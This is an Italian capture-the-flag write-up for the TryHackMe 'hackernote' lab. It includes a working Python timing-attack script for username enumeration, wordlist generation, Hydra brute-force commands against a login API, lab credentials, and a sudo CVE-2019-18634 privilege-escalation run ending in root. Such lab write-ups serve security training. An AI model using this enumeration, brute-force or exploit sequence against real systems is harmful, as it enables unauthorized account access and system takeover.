
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/hackernote

==Exploit==

Ora che sappiamo che esiste un attacco temporale, possiamo scrivere uno script Python per sfruttarlo.

Il primo passo è capire come funzionano le richieste di login. Puoi usare Burpsuite per questo, ma io preferisco usare gli strumenti di sviluppo di Firefox perché non devo configurare alcun proxy.

Qui possiamo vedere che il login è una richiesta POST a /api/user/login. Ciò significa che possiamo effettuare questa richiesta usando CURL, python o un altro linguaggio di programmazione a tua scelta.

In Python, possiamo usare questo codice e la libreria Requests per inviare questa richiesta come segue:

```
creds = {"username":username,"password":"invalidPassword!"}
response = r.post(URL,json=creds)
```

La fase successiva è la tempistica. Utilizzando la libreria standard "time", possiamo calcolare la differenza di tempo tra quando inviamo la richiesta e quando riceviamo una risposta. Ho spostato la richiesta di login nella sua funzione chiamata doLogin.

```
startTime = time.time()
doLogin(user)
endTime = time.time()
```

```
def login(username, password):
    if username in users: ##If it's a valid username
        login_status = check_password(password) ##This takes a noticeable amount of time
        if login_status:
            return new_session_token()
        else:
            return "Username or password incorrect"
    else:
        return "Username or password incorrect"
```
Il passo successivo è ripetere questa operazione per tutti i nomi utente nell'elenco dei nomi utente. Questo può essere fatto con una serie di cicli for. Il primo leggerà i nomi utente da un file in un elenco e il secondo testerà ciascuno di questi nomi utente e vedrà il tempo impiegato per rispondere. Per il mio exploit, ho deciso che i tempi entro il 10% del tempo più grande erano probabilmente nomi utente validi.  
  
```
#!/usr/bin/env python3
import sys
import requests
import time

def main():
    host = '10.10.156.130'

    with open(sys.argv[1]) as f:
        usernames = f.readlines()
    usernames = [x.strip() for x in usernames] 

    for username in usernames:
        start = time.time()
        creds = {"username":username,"password":"notimportant"}
        r = requests.post("http://{}/api/user/login".format(host), data=creds)
        done = time.time()
        elapsed = done - start
        if elapsed > 1:
            print("[*] Valid user found: {}".format(username))

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: {} /path/usernames/file.txt".format(sys.argv[0]))
        sys.exit(1) 
    main()
```

```
./bruteforce-user.py /data/src/SecLists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
```
**Perché il tempo impiegato cambia?**

Il backend è scritto intenzionalmente male. Il server cercherà di verificare la password dell'utente solo se riceve un nome utente corretto. Di seguito è riportato lo pseudocodice per spiegarlo meglio.

Gli exploit pre-scritti in Golang e Python sono disponibili qui:  [https://github.com/NinjaJc01/hackerNoteExploits](https://github.com/NinjaJc01/hackerNoteExploits)[](https://github.com/NinjaJc01/hackerNoteExploits)

Usa Honeypot capture o Names/names.txt da  [https://github.com/danielmiessler/SecLists/tree/master/Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames) . Più breve è l'elenco, più velocemente l'exploit verrà completato. (Suggerimento: uno di quegli elenchi di parole è più breve.)

**NOTA:** l'exploit Golang non è affidabile ma è più veloce. Se ottieni nomi utente non validi, prova a rieseguirlo dopo un minuto o a passare all'exploit Python.

```
nome utente: james
```

==Attack Passwords==
**Passo successivo**

Ora che abbiamo un nome utente, ci serve una password. Poiché le password sono hash con bcrypt e richiedono un tempo notevole per essere verificate, il brute force con una lunga wordlist come rockyou non è fattibile.  
Fortunatamente, questa webapp ha suggerimenti per le password!

Con il nome utente che abbiamo trovato nell'ultimo passaggio, possiamo recuperare il suggerimento per la password. Da questo suggerimento per la password, possiamo creare una wordlist e (in modo più) efficiente forzare la password dell'utente.

**Crea la tua lista di parole**

Il suggerimento per la password è "il mio colore preferito e il mio numero preferito", quindi possiamo ottenere un elenco di parole di colori e un elenco di parole di cifre e combinarli usando Hashcat Util's Combinator che ci darà ogni combinazione dei due elenchi di parole. Utilizzando questo elenco di parole, possiamo quindi usare Hydra per attaccare il percorso dell'API di accesso e trovare la password per l'utente. Scarica i file dell'elenco di parole allegati, guardali e poi combinali usando il combinatore di hashcat-util.  
Hashcat utils può essere scaricato da:  [https://github.com/hashcat/hashcat-utils/releases](https://github.com/hashcat/hashcat-utils/releases)[](https://github.com/hashcat/hashcat-utils/releases)  
Aggiungili al tuo PATH o eseguili dalla cartella.  
Vogliamo usare il binario Combinator.bin, con colors.txt e numbers.txt come input. Il comando per questo è (supponendo che tu sia nella directory con i binari e che tu abbia copiato i file txt in quella directory):

```
./combinator.bin colors.txt numbers.txt > wordlist.txt
```

Questo ti fornirà un elenco di parole da usare per Hydra .  
  

**Attaccare l' API**

La richiesta HTTP POST che abbiamo catturato in precedenza ci dice abbastanza sull'API da poter usare Hydra per attaccarla.  
L'API è in realtà progettata per accettare dati Form o dati JSON. Il frontend invia dati JSON come richiesta POST, quindi useremo questo. Hydra consente di attaccare richieste HTTP POST, con il modulo HTTP -POST. Per usarlo, abbiamo bisogno di:

- Request Body - JSON
    
    {"username":"admin","password":"admin"}
    
- Request Path -
    
    /api/user/login
    
- Error message for incorrect logins -
    
    "Invalid Username Or Password"

Il comando per farlo è (sostituisci le parti con parentesi angolari, dovrai usare l'escape dei caratteri speciali):

```
hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>
```

```
hydra -l james -P wordlist.txt 10.10.156.130 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
```

```
user password: blue7
```
 login sul sito e otteniamo password SSH
```
 james: dak4ddb37b
```

```
$ ssh james@10.10.156.130
james@10.10.156.130's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 17 09:55:51 UTC 2020

  System load:  0.01              Processes:           86
  Usage of /:   49.2% of 9.78GB   Users logged in:     0
  Memory usage: 8%                IP address for eth0: 10.10.156.130
  Swap usage:   0%


59 packages can be updated.
0 updates are security updates.


Last login: Mon Feb 10 11:58:27 2020 from 10.0.2.2
james@hackernote:~$ ls -l
total 4
-rw------- 1 james james 38 Feb  8 22:30 user.txt
james@hackernote:~$ cat user.txt 
thm{56911bd7ba1371a3221478aa5c094d68}
```
==Escalate==

Puoi trovare diversi exploit su Internet. Prendiamo questo
https://github.com/saleemrashid/sudo-cve-2019-18634

```
$ git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
$ cd sudo-cve-2019-18634/
$ make
$ scp exploit james@10.10.211.209:
```
Scaricare l'exploit binario sul target
Eseguiamo l'exploit.
```
james@hackernote:~$ ./exploit 
[sudo] password for james: 
Sorry, try again.
 whoami
root
```

```
ls -l /root
total 4
-rw------- 1 root root 38 Feb  8 22:31 root.txt
cat /root/root.txt
thm{xxxxxxxxxxxxxxxxxxxxxx}
```






